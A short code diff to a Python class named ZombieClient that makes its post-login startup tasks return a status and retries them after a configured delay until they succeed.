@@ -17,7 +17,7 @@ class ZombieClient:
 
     def do_startup_tasks(self):
         # startup tasks are executed one time after succesful login
-        machine.startup_tasks()
+        return machine.startup_tasks()
 
     def keep_logged_in(self):
         token.keep_logged_in()
@@ -40,7 +40,8 @@ class ZombieClient:
             while not token.login():
                 sleep(config.read_setting('inet_unreach_retry'))
 
-            self.do_startup_tasks()
+            while not self.do_startup_tasks():
+                sleep(config.read_setting('inet_unreach_retry'))
 
             threads=[]
 
